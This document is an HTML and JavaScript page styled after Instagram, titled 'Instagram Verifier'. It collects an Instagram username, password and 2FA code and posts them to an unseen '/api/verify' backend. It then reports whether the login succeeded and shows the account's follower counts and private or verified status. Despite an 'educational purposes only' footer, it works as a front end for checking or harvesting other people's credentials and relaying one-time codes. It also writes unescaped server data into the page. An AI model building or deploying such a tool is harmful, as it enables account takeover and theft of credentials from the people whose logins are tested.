<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Account Verifier</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 440px;
            width: 100%;
            padding: 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
        }

        h1 {
            font-size: 24px;
            color: #262626;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #8e8e8e;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.2s;
            background: #fafafa;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 8px;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
        }

        .btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .result {
            display: none;
            margin-top: 20px;
            padding: 16px;
            border-radius: 8px;
            font-size: 14px;
        }

        .result.success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }

        .result.error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }

        .result.warning {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
        }

        .result-title {
            font-weight: 600;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .result-content {
            margin-top: 12px;
        }

        .user-info {
            background: white;
            padding: 12px;
            border-radius: 6px;
            margin-top: 12px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #f0f0f0;
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-label {
            color: #8e8e8e;
            font-size: 13px;
        }

        .info-value {
            font-weight: 600;
            color: #262626;
            font-size: 13px;
        }

        .badge {
            display: inline-block;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
        }

        .badge.verified {
            background: #0095f6;
            color: white;
        }

        .badge.private {
            background: #ffc107;
            color: #000;
        }

        .two-fa-section {
            display: none;
            margin-top: 16px;
            padding: 16px;
            background: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 8px;
        }

        .two-fa-section.show {
            display: block;
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid #efefef;
            color: #8e8e8e;
            font-size: 12px;
        }

        .api-status {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 16px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ccc;
        }

        .status-dot.online {
            background: #4caf50;
            box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üì∏</div>
            <h1>Instagram Verifier</h1>
            <p class="subtitle">Verify Instagram account credentials</p>
            <div class="api-status">
                <span class="status-dot" id="statusDot"></span>
                <span id="statusText">Checking API...</span>
            </div>
        </div>

        <form id="verifyForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input 
                    type="text" 
                    id="username" 
                    name="username" 
                    placeholder="Enter Instagram username"
                    required
                    autocomplete="username"
                >
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    placeholder="Enter password"
                    required
                    autocomplete="current-password"
                >
            </div>

            <div class="two-fa-section" id="twoFaSection">
                <div class="form-group" style="margin-bottom: 0;">
                    <label for="verificationCode">2FA Verification Code</label>
                    <input 
                        type="text" 
                        id="verificationCode" 
                        name="verificationCode" 
                        placeholder="Enter 6-digit code"
                        maxlength="6"
                    >
                </div>
            </div>

            <button type="submit" class="btn" id="submitBtn">
                Verify Account
            </button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 12px; color: #8e8e8e;">Verifying credentials...</p>
        </div>

        <div class="result" id="result"></div>

        <div class="footer">
            <p>‚ö†Ô∏è For educational purposes only</p>
            <p style="margin-top: 4px;">Never share your credentials with untrusted services</p>
        </div>
    </div>

    <script>
        const API_URL = '/api/verify';
        let requires2FA = false;

        // Check API status on load
        async function checkAPIStatus() {
            const statusDot = document.getElementById('statusDot');
            const statusText = document.getElementById('statusText');
            
            try {
                const response = await fetch('/api/verify', {
                    method: 'GET'
                });
                
                if (response.ok) {
                    statusDot.classList.add('online');
                    statusText.textContent = 'API Online';
                } else {
                    statusText.textContent = 'API Error';
                }
            } catch (error) {
                statusText.textContent = 'API Offline';
                console.error('API status check failed:', error);
            }
        }

        // Show result message
        function showResult(type, title, message, userInfo = null) {
            const resultDiv = document.getElementById('result');
            resultDiv.className = `result ${type}`;
            
            let html = `<div class="result-title">${getIcon(type)} ${title}</div>`;
            html += `<div class="result-content">${message}</div>`;
            
            if (userInfo) {
                html += `
                    <div class="user-info">
                        <div class="info-row">
                            <span class="info-label">Username</span>
                            <span class="info-value">@${userInfo.username}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Full Name</span>
                            <span class="info-value">${userInfo.full_name || 'Not set'}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">User ID</span>
                            <span class="info-value">${userInfo.user_id}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Followers</span>
                            <span class="info-value">${userInfo.follower_count.toLocaleString()}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Following</span>
                            <span class="info-value">${userInfo.following_count.toLocaleString()}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Status</span>
                            <span class="info-value">
                                ${userInfo.is_verified ? '<span class="badge verified">‚úì Verified</span>' : ''}
                                ${userInfo.is_private ? '<span class="badge private">üîí Private</span>' : ''}
                                ${!userInfo.is_verified && !userInfo.is_private ? 'Public Account' : ''}
                            </span>
                        </div>
                    </div>
                `;
            }
            
            resultDiv.innerHTML = html;
            resultDiv.style.display = 'block';
        }

        function getIcon(type) {
            const icons = {
                'success': '‚úì',
                'error': '‚úï',
                'warning': '‚ö†'
            };
            return icons[type] || '‚Ä¢';
        }

        function setLoading(isLoading) {
            const form = document.getElementById('verifyForm');
            const loading = document.getElementById('loading');
            const submitBtn = document.getElementById('submitBtn');
            const resultDiv = document.getElementById('result');
            
            if (isLoading) {
                form.style.display = 'none';
                loading.style.display = 'block';
                resultDiv.style.display = 'none';
                submitBtn.disabled = true;
            } else {
                form.style.display = 'block';
                loading.style.display = 'none';
                submitBtn.disabled = false;
            }
        }

        // Handle form submission
        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const verificationCode = document.getElementById('verificationCode').value.trim();
            
            if (!username || !password) {
                showResult('error', 'Validation Error', 'Please enter both username and password');
                return;
            }

            setLoading(true);

            try {
                const payload = {
                    username: username,
                    password: password
                };

                if (verificationCode) {
                    payload.verification_code = verificationCode;
                }

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                const contentType = response.headers.get('content-type');
                if (!contentType || !contentType.includes('application/json')) {
                    throw new Error('Server returned non-JSON response. Please check API configuration.');
                }

                const data = await response.json();

                if (data.success) {
                    showResult('success', 'Login Successful', 'Account credentials are valid!', data.user_info);
                    document.getElementById('twoFaSection').classList.remove('show');
                    requires2FA = false;
                } else if (data.requires_2fa) {
                    showResult('warning', '2FA Required', data.message);
                    document.getElementById('twoFaSection').classList.add('show');
                    requires2FA = true;
                } else {
                    showResult('error', 'Verification Failed', data.message || data.error || 'Login failed');
                    if (!requires2FA) {
                        document.getElementById('twoFaSection').classList.remove('show');
                    }
                }

            } catch (error) {
                console.error('Error:', error);
                showResult('error', 'Network Error', error.message || 'Failed to connect to API. Please check your connection.');
            } finally {
                setLoading(false);
            }
        });

        // Auto-format 2FA code input
        document.getElementById('verificationCode').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
        });

        // Check API status on page load
        checkAPIStatus();
    </script>
</body>
    </html>
